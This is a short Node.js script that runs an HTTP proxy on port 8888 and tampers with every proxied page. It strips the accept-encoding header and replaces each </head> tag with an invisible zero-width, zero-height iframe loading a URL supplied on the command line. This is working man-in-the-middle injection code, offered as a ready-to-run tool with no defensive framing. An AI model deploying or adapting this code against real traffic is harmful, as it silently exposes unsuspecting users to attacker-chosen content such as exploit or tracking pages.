var portApp = 8888;
var proxy = require('./lib/proxy-tamper').start({port: portApp});

var url = undefined;
var payload = ''

// Tampering all the websites (they all should have a dot '.')
proxy.tamper(/\./, function (request) {
  // console.log('[i] Proxying : ' + request.url);

  // gzip encoding is not supported when tampering the body
  delete request.headers['accept-encoding'];

  request.onResponse(function (response) {
    console.log('[+] Tampering : ' + request.url);
    // response.body = response.body.replace(/Google/g, 'Orange');

    // replace the tag head in the body by inserting an iframe
    response.body = response.body.replace(/<\/head>/g, payload);

    // complete the response
    response.complete();
  });
});


// check for command line argument url to be injected
if (process.argv[2] == undefined) {
  console.log("Usage : node server.js <url>");
  process.exit(1);
} else {
  console.log("Proxy server listening on port %d", portApp);

  url  = process.argv[2];
  console.log("Injecting " + url + " while tampering HTTP traffic");
  payload = '<iframe src="' + url + '" width=0 height=0><\/iframe><\/head>'
}
